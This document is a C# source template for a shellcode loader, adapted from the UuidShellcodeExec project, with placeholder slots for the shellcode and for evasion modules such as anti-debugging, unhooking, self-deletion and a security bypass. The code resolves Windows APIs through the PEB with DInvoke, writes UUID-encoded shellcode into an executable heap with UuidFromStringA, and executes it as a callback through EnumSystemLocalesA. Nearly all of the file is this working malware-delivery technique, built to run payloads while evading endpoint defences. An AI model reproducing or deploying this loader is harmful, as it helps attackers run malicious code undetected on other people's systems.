using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Runtime;
using System.Threading;
//####USING#####

/*
* Template taken from
* https://raw.githubusercontent.com/ChoiSG/UuidShellcodeExec/main/USEConsole/Program.cs
* Credit: ChoiSG
*/

namespace USEConsole
{

    //####CODE####

    class Program
    {
        static void Main(string[] args)
        {
            //####DELAY####
            //####SELF_DELETE####
            //####UNHOOK####
            //####ANTIDEBUG####
            //####BYPASS####

            string[] uuids = ####SHELLCODE####;


            // Get pointer to DLLs from PEB
            IntPtr pkernel32 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr prpcrt4 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("rpcrt4.dll");

            // Function pointers for winapi calls
            IntPtr pHeapCreate = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapCreate");
            //IntPtr pHeapAlloc = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapAlloc");
            IntPtr pEnumSystemLocalesA = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "EnumSystemLocalesA");
            IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");

            // 1. Heap Create + Alloc
            object[] heapCreateParam = { (uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero };
            var heapHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapCreate, typeof(DELEGATE.HeapCreate), ref heapCreateParam);

            // Heap Alloc is not needed and only gives accessviolationerror - Can't really debug why that is
            //object[] heapAllocParam = { heapHandle, (uint)0, (uint)0x100000 };
            //var heapAddr = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapAlloc, typeof(DELEGATE.HeapAlloc), ref heapAllocParam);
            //Console.WriteLine("[>] Allocated Heap address - 0x{0}", heapAddr.ToString("x2"));

            // 2. Writing shellcode from UUID to binary to the heap
            IntPtr newHeapAddr = IntPtr.Zero;
            for (int i = 0; i < uuids.Length; i++)
            {
                Console.WriteLine("  [>] {0}", uuids[i]);
                newHeapAddr = IntPtr.Add(heapHandle, 16 * i);
                object[] uuidFromStringAParam = { uuids[i], newHeapAddr };
                var status = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pUuidFromStringA, typeof(DELEGATE.UuidFromStringA), ref uuidFromStringAParam);

            }

            // 3. Executing shellcode as a callback function
            object[] enumSystemLocalesAParam = { heapHandle, 0 };
            var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);

            // Use this if #3 gies access violation error
            //var enumSystemLocalesA = Marshal.GetDelegateForFunctionPointer(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA)) as DELEGATE.EnumSystemLocalesA;
            //enumSystemLocalesA(heapAddr, 0);
        }
    }

    public class DELEGATE
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr UuidFromStringA(string StringUuid, IntPtr heapPointer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);

    }
}